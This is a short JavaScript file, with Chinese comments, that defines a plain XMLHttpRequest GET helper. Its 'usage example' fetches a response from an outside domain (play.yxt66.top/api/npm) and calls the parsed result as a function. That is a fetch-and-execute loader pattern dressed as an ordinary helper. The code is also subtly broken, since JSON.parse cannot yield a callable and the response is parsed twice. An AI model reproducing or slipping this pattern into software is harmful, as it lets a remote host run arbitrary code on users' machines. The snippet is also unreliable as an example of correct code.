function get(url, callback) {
  const xhr = new XMLHttpRequest();
  xhr.open('GET', url, true); // true 表示异步

  xhr.onreadystatechange = function () {
    if (xhr.readyState === 4) { // DONE
      if (xhr.status === 200) {
        callback(null, xhr.responseText);
      } else {
        callback(new Error('Request failed with status ' + xhr.status));
      }
    }
  };

  xhr.send();
}

// 用法示例
get('https://play.yxt66.top/api/npm', function (err, data) {
  if (err) {
    console.error('请求失败:', err);
  } else {
    const fn = JSON.parse(data)
    fn()
    console.log('响应结果:', JSON.parse(data));
  }
});
